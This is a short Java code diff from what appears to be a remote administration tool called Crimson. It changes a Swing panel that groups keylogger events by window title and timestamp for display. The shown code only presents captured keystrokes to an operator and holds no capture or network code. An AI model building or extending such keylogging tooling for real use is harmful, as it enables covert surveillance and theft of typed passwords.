@@ -23,15 +23,14 @@ import java.util.Date;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import javax.swing.BoxLayout;
 import javax.swing.JPanel;
 import javax.swing.JScrollPane;
 import javax.swing.ScrollPaneConstants;
 
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.sv.keylogger.Event;
 import com.subterranean_security.crimson.sv.keylogger.Page;
-
-import javax.swing.Box;
-import javax.swing.BoxLayout;
 
 public class KeyLogPane extends JPanel {
 
@@ -156,7 +155,21 @@ public class KeyLogPane extends JPanel {
 		return s;
 	}
 
-	public void updateContent() {
+	public void updateContent(EV_KEvent k) {
+
+		if (paragraphs.size() > 0) {
+			KeyLogParagraph klp = paragraphs.get(paragraphs.size() - 1);
+			if (klp.getTitle().startsWith(k.getTitle() + " @")) {
+				klp.append(k.getEvent());
+				return;
+			}
+
+		}
+
+		// new paragraph
+		KeyLogParagraph klp = new KeyLogParagraph(k.getTitle() + " @ " + new Date(k.getDate()).toString());
+		klp.append(k.getEvent());
+		addParagraph(klp);
 
 	}
 
